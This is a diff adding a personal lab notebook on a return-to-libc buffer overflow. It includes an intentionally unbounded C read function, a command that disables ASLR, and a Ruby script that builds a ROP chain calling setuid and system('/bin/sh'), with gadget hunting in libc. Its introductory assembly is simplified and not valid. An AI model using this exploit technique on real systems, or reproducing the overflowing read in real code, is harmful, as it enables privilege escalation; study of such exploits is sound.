@@ -1,0 +1,433 @@
+#+TITLE: Return Libc buffer overflow
+#+AUTHOR: Steven Quinito Masnada
+
+* Principle
+** Function call mechanism
+*** x86_64
+**** Call
+     The caller save the next instruction to the stack and jump the
+     address of the callee.
+     #+BEGIN_SRC asm
+       push 0x8($rip)          // return address
+       jmp  0x74856abeffff0    // Jump to the function located at address 0x74856abeffff0
+     #+END_SRC
+**** Return
+     #+BEGIN_SRC asm
+       pop $rip
+     #+END_SRC
+** The stack
+   For =X86_64=:
+   | Argument N    | RBP + 8 + N * 8 | <- High address
+   |---------------+-----------------|
+   | Argument ...  |                 |
+   |---------------+-----------------|
+   | Argument 1    | RBP + 16        |
+   |---------------+-----------------|
+   | Return adress | RBP + 8         |
+   |---------------+-----------------|
+   | Old FP        | RBP             |
+   |---------------+-----------------|
+   | Local var 1   | RBP - 8         |
+   | Local var 2   | RBP - 16        | <- Low address
+* Preparation
+** Desactivate ASLR
+  #+begin_src sh :results output :exports both
+    echo 0 > /proc/sys/kernel/randomize_va_space
+  #+end_src
+** The program
+   #+begin_src c :results output :exports both
+     #include <stdio.h>
+     #include <stdlib.h>
+
+     // 0x7ffff7e34560
+     // 0x555555555030
+
+     void read(FILE *fd){
+         char buffer[8];
+         int i = 0;
+
+         while((buffer[i++] = fgetc(fd)) != EOF);
+     }
+
+     int main(){
+         char filename[] = "badfile.txt";
+         FILE *fd;
+
+         fd = fopen(filename, "r");
+
+         if(fd == NULL){
+             perror("Error while opening the file");
+             exit(EXIT_FAILURE);
+         }
+
+         read(fd);
+    
+         return 0;
+     }
+
+   #+end_src
+** Generator
+   #+BEGIN_SRC ruby :results output :exports both
+     #!/usr/bin/env ruby
+     def format(addr)
+       return [addr].pack("Q*")
+     end
+
+     ret_addr_pos = 20
+     a = (ret_addr_pos-3).times.map{'a'}.join
+     junk = "B#{a}d!"
+
+     # Compute and format the address of system libc function
+     base = 0x7ffff7de0000
+     system = base + 0x449c0
+     exit = base + 0x39ea0
+     shell = base + 0x181519
+     setuid = base + 0xc7500
+     gets = base + 0x71040
+     gadget = base + 0xf94cb
+     # gadget = base + 0xf4a13
+
+     puts "system : 0x%x" % system
+     puts "exit : 0x%x" % exit
+     puts "shell : 0x%x" % shell
+     puts "setuid : 0x%x" % setuid
+     puts "gets : 0x%x" % gets
+     puts "gadget : 0x%x" % gadget
+
+     system = format(system)
+     exit = format(exit)
+     shell = format(shell)
+     setuid = format(setuid)
+     gets = format(gets)
+     gadget = format(gadget)
+     test = format(0x7fffffffefb5)
+
+     # text = "#{junk}#{s_gets}#{s_setuid}#{s_system}#{s_exit}#{s_shell}"
+     # text = "#{junk}#{system}#{exit}AAAA#{shell}"
+     # text = "#{junk}#{gadget}#{system}#{shell}#{exit}"
+     # text = "#{junk}#{gadget}#{gets}#{test}#{gadget}#{setuid}#{test}#{gadget}#{system}#{shell}#{exit}"
+
+     text = junk
+     text += gadget
+     text += gets
+     text += test
+     text += gadget
+     text += setuid
+     text += test
+     text += gadget
+     text += system
+     text += shell
+     text += exit
+
+     # text = junk
+     # text += gadget
+     # text += test
+     # text += gets
+     # text += gadget
+     # text += test
+     # text += setuid
+     # text += gadget
+     # text += shell
+     # text += system
+     # text += exit
+
+     puts text
+
+     File.write("badfile.txt", text)
+   #+END_SRC
+
+   #+RESULTS:
+   : system : 0x7ffff7e249c0
+   : exit : 0x7ffff7e19ea0
+   : shell : 0x7ffff7f61519
+   : setuid : 0x7ffff7ea7500
+   : gets : 0x7ffff7e51040
+   : gadget : 0x7ffff7ed94cb
+   : Baaaaaaaaaaaaaaaaad!\0\0@\0\0\0\0\0\0\0u\0\0\0\0\0\0I\0\0\0\0\0\0
+
+* Call the libc
+** Find the base address:
+   #+begin_src sh :results output :exports both
+     cat /proc/PID/maps
+   #+end_src
+
+   #+RESULTS:
+   : 7ffff7ddc000-7ffff7dfe000 r--p 00000000 fd:00 3019018                    /usr/lib/x86_64-linux-gnu/libc-2.28.so
+   : 7ffff7dfe000-7ffff7f46000 r-xp 00022000 fd:00 3019018                    /usr/lib/x86_64-linux-gnu/libc-2.28.so 
+   : 7ffff7f46000-7ffff7f92000 r--p 0016a000 fd:00 3019018                    /usr/lib/x86_64-linux-gnu/libc-2.28.so
+   : 7ffff7f92000-7ffff7f93000 ---p 001b6000 fd:00 3019018                    /usr/lib/x86_64-linux-gnu/libc-2.28.so
+   : 7ffff7f93000-7ffff7f97000 r--p 001b6000 fd:00 3019018                    /usr/lib/x86_64-linux-gnu/libc-2.28.so
+   : 7ffff7f97000-7ffff7f99000 rw-p 001ba000 fd:00 3019018                    /usr/lib/x86_64-linux-gnu/libc-2.28.so
+   : 7ffff7f99000-7ffff7f9d000 rw-p 00000000 00:00 0
+
+** Find the offset of the system function:
+   #+begin_src sh :results output :exports both
+     readelf -a /usr/lib/x86_64-linux-gnu/libc.so.6 | grep system
+   #+end_src
+
+** Find offset of /bin/sh
+   #+begin_src sh :results output :exports both
+     strings -t x /lib/x86_64-linux-gnu/libc.so.6| grep /bin/sh
+   #+end_src
+** Find Gadget pop rdi ; ret
+   #+begin_src sh :results output :exports both
+     objdump -d /lib/x86_64-linux-gnu/libc.so.6 | grep -B5 call | grep -C5 rdi | grep pop | grep rdi 
+   #+end_src
+
+   #+RESULTS:
+   :    c6970:	5f                   	pop    %rdi
+   :    f94cc:	5f                   	pop    %rdi
+   :   10af65:	5f                   	pop    %rdi
+   :   11f093:	5f                   	pop    %rdi
+   :   129240:	5f                   	pop    %rdi
+
+   - +c6970+ \to this could actually do the trick, even with the syscall (vfork)
+     #+begin_src sh :results output :exports both
+       objdump -d /lib/x86_64-linux-gnu/libc.so.6 | grep -A 10 c6970
+     #+end_src
+
+     #+RESULTS:
+     #+begin_example
+     00000000000c6970 <__libc_vfork@@GLIBC_PRIVATE>:
+        c6970:	5f                   	pop    %rdi
+        c6971:	b8 3a 00 00 00       	mov    $0x3a,%eax
+        c6976:	0f 05                	syscall 
+        c6978:	57                   	push   %rdi
+        c6979:	3d 01 f0 ff ff       	cmp    $0xfffff001,%eax
+        c697e:	73 01                	jae    c6981 <__libc_vfork@@GLIBC_PRIVATE+0x11>
+        c6980:	c3                   	retq   
+        c6981:	48 8b 0d e8 44 0f 00 	mov    0xf44e8(%rip),%rcx        # 1bae70 <h_errlist@@GLIBC_2.2.5+0xdd0>
+        c6988:	f7 d8                	neg    %eax
+        c698a:	64 89 01             	mov    %eax,%fs:(%rcx)
+        c698d:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
+     #+end_example
+   - f94cc
+     #+begin_src sh :results output :exports both
+       objdump -d /lib/x86_64-linux-gnu/libc.so.6 | grep -C 10 f94cc
+     #+end_src
+
+     #+RESULTS:
+     #+begin_example
+        f94b2:	4d 89 c8             	mov    %r9,%r8
+        f94b5:	4c 8b 54 24 08       	mov    0x8(%rsp),%r10
+        f94ba:	b8 38 00 00 00       	mov    $0x38,%eax
+        f94bf:	0f 05                	syscall 
+        f94c1:	48 85 c0             	test   %rax,%rax
+        f94c4:	7c 13                	jl     f94d9 <__clone@@GLIBC_2.2.5+0x49>
+        f94c6:	74 01                	je     f94c9 <__clone@@GLIBC_2.2.5+0x39>
+        f94c8:	c3                   	retq   
+        f94c9:	31 ed                	xor    %ebp,%ebp
+        f94cb:	58                   	pop    %rax
+        f94cc:	5f                   	pop    %rdi
+        f94cd:	ff d0                	callq  *%rax
+        f94cf:	48 89 c7             	mov    %rax,%rdi
+        f94d2:	b8 3c 00 00 00       	mov    $0x3c,%eax
+        f94d7:	0f 05                	syscall 
+        f94d9:	48 8b 0d 90 19 0c 00 	mov    0xc1990(%rip),%rcx        # 1bae70 <h_errlist@@GLIBC_2.2.5+0xdd0>
+        f94e0:	f7 d8                	neg    %eax
+        f94e2:	64 89 01             	mov    %eax,%fs:(%rcx)
+        f94e5:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
+        f94e9:	c3                   	retq   
+        f94ea:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
+     #+end_example
+   - +10af65+
+     #+begin_src sh :results output :exports both
+       objdump -d /lib/x86_64-linux-gnu/libc.so.6 | grep -C10 10af65
+     #+end_src
+
+     #+RESULTS:
+     #+begin_example
+       10af3c:	44 89 e6             	mov    %r12d,%esi
+       10af3f:	ff 74 24 48          	pushq  0x48(%rsp)
+       10af43:	4c 8b 4c 24 10       	mov    0x10(%rsp),%r9
+       10af48:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
+       10af4d:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
+       10af52:	8b 54 24 48          	mov    0x48(%rsp),%edx
+       10af56:	48 8b 7c 24 18       	mov    0x18(%rsp),%rdi
+       10af5b:	e8 e0 39 02 00       	callq  12e940 <svc_run@@GLIBC_2.2.5+0x18b0>
+       10af60:	89 44 24 4c          	mov    %eax,0x4c(%rsp)
+       10af64:	5e                   	pop    %rsi
+       10af65:	5f                   	pop    %rdi
+       10af66:	85 c0                	test   %eax,%eax
+       10af68:	0f 88 6d fe ff ff    	js     10addb <gethostbyaddr_r@@GLIBC_2.2.5+0x9b>
+       10af6e:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
+       10af73:	e8 98 f4 00 00       	callq  11a410 <__resolv_context_put@@GLIBC_PRIVATE>
+       10af78:	e9 d9 00 00 00       	jmpq   10b056 <gethostbyaddr_r@@GLIBC_2.2.5+0x316>
+       10af7d:	0f 1f 00             	nopl   (%rax)
+       10af80:	41 8d 45 02          	lea    0x2(%r13),%eax
+       10af84:	48 8b 54 24 58       	mov    0x58(%rsp),%rdx
+       10af89:	48 98                	cltq   
+       10af8b:	83 7c 82 08 02       	cmpl   $0x2,0x8(%rdx,%rax,4)
+     #+end_example
+   - +11f093+
+     #+begin_src sh :results output :exports both
+       objdump -d /lib/x86_64-linux-gnu/libc.so.6 | grep -B15 11f090
+     #+end_src
+
+     #+RESULTS:
+     #+begin_example
+       11f054:	ba 02 00 00 00       	mov    $0x2,%edx
+       11f059:	be a0 86 01 00       	mov    $0x186a0,%esi
+       11f05e:	e8 8d 82 00 00       	callq  1272f0 <clnttcp_create@@GLIBC_2.2.5>
+       11f063:	48 89 c5             	mov    %rax,%rbp
+       11f066:	48 85 c0             	test   %rax,%rax
+       11f069:	74 a8                	je     11f013 <pmap_getmaps@@GLIBC_2.2.5+0xe3>
+       11f06b:	48 8b 40 08          	mov    0x8(%rax),%rax
+       11f06f:	41 56                	push   %r14
+       11f071:	be 04 00 00 00       	mov    $0x4,%esi
+       11f076:	48 89 ef             	mov    %rbp,%rdi
+       11f079:	41 55                	push   %r13
+       11f07b:	4c 8d 05 be 00 00 00 	lea    0xbe(%rip),%r8        # 11f140 <xdr_pmaplist@@GLIBC_2.2.5>
+       11f082:	31 c9                	xor    %ecx,%ecx
+       11f084:	48 8d 15 e5 c8 00 00 	lea    0xc8e5(%rip),%rdx        # 12b970 <xdr_void@@GLIBC_2.2.5>
+       11f08b:	4c 8d 4c 24 20       	lea    0x20(%rsp),%r9
+       11f090:	ff 10                	callq  *(%rax)
+     #+end_example
+   - +129240+
+     #+begin_src sh :results output :exports both
+       objdump -d /lib/x86_64-linux-gnu/libc.so.6 | grep -C10 129240
+     #+end_src
+
+     #+RESULTS:
+     #+begin_example
+       129218:	68 90 01 00 00       	pushq  $0x190
+       12921d:	4c 89 c1             	mov    %r8,%rcx
+       129220:	be a0 86 01 00       	mov    $0x186a0,%esi
+       129225:	45 31 c0             	xor    %r8d,%r8d
+       129228:	68 90 01 00 00       	pushq  $0x190
+       12922d:	ba 02 00 00 00       	mov    $0x2,%edx
+       129232:	45 31 e4             	xor    %r12d,%r12d
+       129235:	4c 8d 4c 24 3c       	lea    0x3c(%rsp),%r9
+       12923a:	e8 41 f0 ff ff       	callq  128280 <clntudp_bufcreate@@GLIBC_2.2.5>
+       12923f:	5e                   	pop    %rsi
+       129240:	5f                   	pop    %rdi
+       129241:	49 89 c7             	mov    %rax,%r15
+       129244:	48 85 c0             	test   %rax,%rax
+       129247:	0f 84 90 00 00 00    	je     1292dd <__libc_rpc_getport@@GLIBC_PRIVATE+0x11d>
+       12924d:	e8 ee 02 00 00       	callq  129540 <__rpc_thread_createerr@@GLIBC_2.2.5>
+       129252:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
+       129257:	be 03 00 00 00       	mov    $0x3,%esi
+       12925c:	4c 89 ff             	mov    %r15,%rdi
+       12925f:	48 89 44 24 18       	mov    %rax,0x18(%rsp)
+       129264:	48 8b 44 24 08       	mov    0x8(%rsp),%rax
+       129269:	48 8d 15 70 5e ff ff 	lea    -0xa190(%rip),%rdx        # 11f0e0 <xdr_pmap@@GLIBC_2.2.5>
+     #+end_example
+
+   #+begin_src sh :results output :exports both
+     objdump -d /lib/x86_64-linux-gnu/libc.so.6 | grep -B10 ret | grep -C5 rdi | grep pop | grep rdi 
+   #+end_src
+
+   #+RESULTS:
+   :    c6970:	5f                   	pop    %rdi
+   :    f4a13:	5f                   	pop    %rdi
+   :    f94cc:	5f                   	pop    %rdi
+
+   - +f4a13+
+     #+begin_src sh :results output :exports both
+       objdump -d /lib/x86_64-linux-gnu/libc.so.6 | grep -C 10 f4a13
+     #+end_src
+
+     #+RESULTS:
+     #+begin_example
+        f49ed:	5d                   	pop    %rbp
+        f49ee:	41 5c                	pop    %r12
+        f49f0:	c3                   	retq   
+        f49f1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
+        f49f8:	ff 74 24 28          	pushq  0x28(%rsp)
+        f49fc:	41 b8 21 00 00 00    	mov    $0x21,%r8d
+        f4a02:	48 8d 0d b7 99 0c 00 	lea    0xc99b7(%rip),%rcx        # 1be3c0 <__curbrk@@GLIBC_2.2.5+0x320>
+        f4a09:	ff 74 24 28          	pushq  0x28(%rsp)
+        f4a0d:	e8 9e 00 00 00       	callq  f4ab0 <qfcvt_r@@GLIBC_2.2.5>
+        f4a12:	5e                   	pop    %rsi
+        f4a13:	5f                   	pop    %rdi
+        f4a14:	83 f8 ff             	cmp    $0xffffffff,%eax
+        f4a17:	74 0f                	je     f4a28 <qfcvt@@GLIBC_2.2.5+0x78>
+        f4a19:	5b                   	pop    %rbx
+        f4a1a:	48 8d 05 9f 99 0c 00 	lea    0xc999f(%rip),%rax        # 1be3c0 <__curbrk@@GLIBC_2.2.5+0x320>
+        f4a21:	5d                   	pop    %rbp
+        f4a22:	41 5c                	pop    %r12
+        f4a24:	c3                   	retq   
+        f4a25:	0f 1f 00             	nopl   (%rax)
+        f4a28:	bf 65 13 00 00       	mov    $0x1365,%edi
+        f4a2d:	e8 d6 d8 f2 ff       	callq  22308 <malloc@plt>
+     #+end_example
+
+   #+begin_src sh :results output :exports both
+     strings -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
+   #+end_src
+
+   #+RESULTS:
+   :  181519 /bin/sh
+
+   #+begin_src sh :results output :exports both
+     objdump -d /lib/x86_64-linux-gnu/libc.so.6 | grep -B5 execve | grep -C5 181519
+   #+end_src
+
+   #+RESULTS:
+   #+begin_example
+   --
+      c70c2:	49 c7 45 10 00 00 00 	movq   $0x0,0x10(%r13)
+      c70c9:	00 
+      c70ca:	4c 89 e2             	mov    %r12,%rdx
+      c70cd:	4c 89 ee             	mov    %r13,%rsi
+      c70d0:	48 8d 3d 42 a4 0b 00 	lea    0xba442(%rip),%rdi        # 181519 <_libc_intl_domainname@@GLIBC_2.2.5+0x15f>
+      c70d7:	e8 24 f9 ff ff       	callq  c6a00 <execve@@GLIBC_2.2.5>
+   --
+      c7182:	48 85 c0             	test   %rax,%rax
+      c7185:	74 59                	je     c71e0 <execlp@@GLIBC_2.2.5+0x330>
+      c7187:	4c 89 ea             	mov    %r13,%rdx
+   --
+      c7338:	e8 c3 f6 ff ff       	callq  c6a00 <execve@@GLIBC_2.2.5>
+   --
+      e5451:	e8 ea 56 00 00       	callq  eab40 <__close@@GLIBC_2.2.5>
+      e5456:	48 8b 05 53 5a 0d 00 	mov    0xd5a53(%rip),%rax        # 1baeb0 <__environ@@GLIBC_2.2.5-0x31d0>
+      e545d:	48 8d 74 24 60       	lea    0x60(%rsp),%rsi
+      e5462:	48 8d 3d b0 c0 09 00 	lea    0x9c0b0(%rip),%rdi        # 181519 <_libc_intl_domainname@@GLIBC_2.2.5+0x15f>
+      e5469:	48 8b 10             	mov    (%rax),%rdx
+      e546c:	e8 8f 15 fe ff       	callq  c6a00 <execve@@GLIBC_2.2.5>
+   --
+      e965c:	01 00 00 00 
+      e9660:	e9 0d fc ff ff       	jmpq   e9272 <posix_spawnp@@GLIBC_2.15+0x3d2>
+   #+end_example
+
+   #+begin_src sh :results output :exports both
+     objdump -d /lib/x86_64-linux-gnu/libc.so.6 | grep -B5 setuid
+   #+end_src
+
+   #+RESULTS:
+   #+begin_example
+      c74f0:	c3                   	retq   
+      c74f1:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
+      c74f8:	00 00 00 
+      c74fb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
+
+   00000000000c7500 <setuid@@GLIBC_2.2.5>:
+   --
+      c750b:	00 00 
+      c750d:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
+      c7512:	31 c0                	xor    %eax,%eax
+      c7514:	8b 05 c6 91 0f 00    	mov    0xf91c6(%rip),%eax        # 1c06e0 <argp_program_version_hook@@GLIBC_2.2.5+0x1c0>
+      c751a:	85 c0                	test   %eax,%eax
+      c751c:	75 2a                	jne    c7548 <setuid@@GLIBC_2.2.5+0x48>
+      c751e:	b8 69 00 00 00       	mov    $0x69,%eax
+      c7523:	0f 05                	syscall 
+      c7525:	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax
+      c752b:	77 4b                	ja     c7578 <setuid@@GLIBC_2.2.5+0x78>
+      c752d:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
+      c7532:	64 48 33 0c 25 28 00 	xor    %fs:0x28,%rcx
+      c7539:	00 00 
+      c753b:	75 4e                	jne    c758b <setuid@@GLIBC_2.2.5+0x8b>
+   --
+      c7559:	48 8b 05 70 91 0f 00 	mov    0xf9170(%rip),%rax        # 1c06d0 <argp_program_version_hook@@GLIBC_2.2.5+0x1b0>
+      c7560:	48 c1 c8 11          	ror    $0x11,%rax
+      c7564:	64 48 33 04 25 30 00 	xor    %fs:0x30,%rax
+      c756b:	00 00 
+      c756d:	ff d0                	callq  *%rax
+      c756f:	eb bc                	jmp    c752d <setuid@@GLIBC_2.2.5+0x2d>
+      c7571:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
+      c7578:	48 8b 15 f1 38 0f 00 	mov    0xf38f1(%rip),%rdx        # 1bae70 <h_errlist@@GLIBC_2.2.5+0xdd0>
+      c757f:	f7 d8                	neg    %eax
+      c7581:	64 89 02             	mov    %eax,%fs:(%rdx)
+      c7584:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
+      c7589:	eb a2                	jmp    c752d <setuid@@GLIBC_2.2.5+0x2d>
+   #+end_example
